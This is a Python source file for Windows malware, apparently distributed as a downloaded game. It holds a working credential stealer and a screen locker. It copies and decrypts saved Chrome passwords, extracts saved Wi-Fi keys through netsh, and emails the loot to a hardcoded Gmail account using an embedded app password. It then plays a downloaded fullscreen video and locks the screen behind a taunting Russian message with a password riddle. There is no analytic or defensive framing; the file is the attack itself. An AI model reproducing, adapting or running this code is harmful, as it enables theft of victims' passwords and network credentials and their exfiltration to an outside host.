import os, time, threading, tempfile, tkinter as tk
import urllib.request, smtplib, socket, subprocess, json, base64, random, re
from email.mime.text import MIMEText
import cv2, numpy as np
from PIL import ImageGrab
import sqlite3, win32crypt, shutil

PASSWORD = "1601"
MAX_ATTEMPTS = 4
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
attempts_left = MAX_ATTEMPTS

def download_file(url, path):
    try:
        if os.path.exists(path): os.remove(path)
        urllib.request.urlretrieve(url, path)
    except: pass

def play_video():
    try:
        download_file(VIDEO_URL, VIDEO_PATH)
        download_file(AUDIO_URL, AUDIO_PATH)
        time.sleep(1)
        
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            v = tk.Tk()
            v.attributes('-fullscreen', True); v.configure(bg='black')
            v.overrideredirect(True); v.protocol("WM_DELETE_WINDOW", lambda: None)
            lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
            
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0: fps = 30
            
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                frame = cv2.resize(frame, (v.winfo_screenwidth(), v.winfo_screenheight()))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
                lbl.config(image=img); lbl.image = img; v.update()
                time.sleep(1/fps)
            
            cap.release(); v.destroy()
    except: pass

def steal_chrome():
    res = []
    path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    if os.path.exists(path):
        try:
            db = os.path.join(tempfile.gettempdir(), 'chrome.db')
            shutil.copy2(path, db)
            cur = sqlite3.connect(db).cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, pw in cur:
                try:
                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                    res.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}\n" + "-"*40)
                except: pass
            cur.close(); os.remove(db)
        except: pass
    return res

def steal_wifi():
    r = []
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
        for line in output.split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl: r.append(f"WiFi: {p} | Пароль: {dl.split(':')[1].strip()}")
    except: pass
    return r

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

def mega_steal():
    report = ["DEDSEK STEALER", f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}"]
    chrome_data = steal_chrome()
    if chrome_data: report.append("\nCHROME:"); report.extend(chrome_data)
    wifi_data = steal_wifi()
    if wifi_data: report.append("\nWIFI:"); report.extend(wifi_data)
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
        send_email(part, f"[DedSek_Logs] [{i+1}]")

class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.configure(bg='black')
        self.win.overrideredirect(True); self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.focus_force()
        global attempts_left
        
        msg = f"""Ну привет друг, как у тебя дела?

Да, понимаю, ты попался.
Ну и нахуя ты скачал игру из инета?
Я не пойму...

Ну ладно, вот тебе загадка. Там пароль.

Я — год, когда произошло событие,
которое не произошло.
В Англии заговорщики планировали
взорвать парламент и убить короля.
Их план провалился, король выжил,
а заговорщиков казнили.
Но в Windows я стал началом времён.

ЧТО Я ЗА ЧИСЛО?

У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
        
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',9,'bold'), justify='left').place(relx=0.5, rely=0.4, anchor='center')
        tk.Label(self.win, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).place(relx=0.5, rely=0.8, anchor='center')
        self.pw = tk.Entry(self.win, show="*", font=('Courier',14,'bold'), bg='white', fg='black')
        self.pw.place(relx=0.5, rely=0.85, anchor='center', width=200, height=35)
        self.sl = tk.Label(self.win, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
        self.sl.place(relx=0.5, rely=0.9, anchor='center')
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            self.sl.config(text="ВЕРНО!"); self.win.after(1000, lambda: os._exit(0))
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}")
            else: self.sl.config(text="404 | ОШИБКА"); self.win.after(2000, lambda: os._exit(0))
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    threading.Thread(target=mega_steal, daemon=True).start()
    try: play_video()
    except: pass
    WinLocker()
    tk.mainloop()
